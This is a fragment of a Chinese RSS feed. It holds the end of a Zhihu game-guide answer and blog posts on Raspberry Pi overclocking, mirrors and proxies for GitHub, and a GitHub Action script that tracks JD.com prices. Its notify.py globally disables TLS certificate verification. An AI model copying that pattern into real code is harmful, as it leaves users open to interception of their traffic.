noreferrer\">皇帝的成长计划攻略——策卡之五行谶纬</a><hr>\n<p><i>还有问题的可以评论区问</i></p>\n<p><i>如果我可以回答我再总结过来</i></p>\n<p><i>谢谢你们点的赞同</i></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7672a8bcd095d5eec04b36ae54d28d00_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"128\" data-rawheight=\"128\" data-watermark=\"watermark\" data-original-src=\"v2-7672a8bcd095d5eec04b36ae54d28d00\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<a data-draft-node=\"block\" data-draft-type=\"ad-link-card\" data-ad-id=\"fee_0de7ab2daf224ebf58578c2384719ff5\"></a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/shi-yi-95-63-9?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">魔仙堡大美人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/328462161/answer/986274203?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">135 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/376333917?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏《烟雨江湖》应该怎么玩？有哪些攻略？</a><br><a href=\"http://www.zhihu.com/question/371309642?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏《三国志14》应该怎么玩？有哪些攻略？</a><br>\n","link":"http://www.zhihu.com/question/328462161/answer/986274203?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 15:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"订阅 YFun's Blog","date":"2021-06-20 10:30:00","description":"\n<p>自 2021 年 6 月 20 日起，本博客将同步更新 Twitter 和 Telegram 频道(由 IFTTT 提供支持)。</p>\n<ul>\n<li><a href=\"https://t.me/s/always_explore\">Telegram Channel</a></li>\n<li><a href=\"https://twitter.com/OhhhCKY\">Twitter</a></li>\n</ul>\n","link":"https://blog.yfun.top/posts/3249015232/"},{"title":"加速 GitHub 下载","date":"2021-06-18 17:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 18:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" 